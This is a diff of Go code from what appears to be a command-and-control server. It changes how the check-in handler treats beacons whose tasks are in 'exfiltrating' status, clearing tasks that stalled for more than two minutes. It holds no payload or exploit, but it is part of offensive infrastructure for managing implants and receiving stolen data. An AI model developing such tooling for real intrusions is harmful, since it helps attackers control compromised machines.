@@ -999,12 +999,25 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 					logf("[DEBUG] Cleared completed task %s from beacon %s CurrentTask", task.ID, beaconID)
 				}
 			} else if task.Status == "exfiltrating" {
-				// Task is being exfiltrated - DO NOT re-send, beacon is already executing
-				c2.mutex.Unlock()
-				if c2.debug && !isDuplicate {
-					logf("[DEBUG] Beacon %s is exfiltrating task %s, returning ACK (no re-send)", beaconID, task.ID)
+				// Task is being exfiltrated - check if we're still actively receiving chunks
+				// If the ExpectedResult is stale (>2 minutes old), clear CurrentTask and allow next task
+				expected, hasExpectation := c2.expectedResults[task.ID]
+
+				if hasExpectation && time.Since(expected.ReceivedAt) < 2*time.Minute {
+					// Still actively receiving chunks - DO NOT re-send or clear
+					c2.mutex.Unlock()
+					if c2.debug && !isDuplicate {
+						logf("[DEBUG] Beacon %s is actively exfiltrating task %s, returning ACK", beaconID, task.ID)
+					}
+					return "ACK"
+				} else {
+					// Exfiltration stalled or beacon finished - clear CurrentTask and proceed to queue
+					beacon.CurrentTask = ""
+					if c2.debug {
+						logf("[DEBUG] Task %s exfiltration stalled/finished, clearing CurrentTask for beacon %s", task.ID, beaconID)
+					}
+					// Don't return - fall through to check queue for next task
 				}
-				return "ACK"
 			} else {
 				// Task still pending/sent - resend the same task (idempotent)
 				// This handles duplicate check-ins or retries
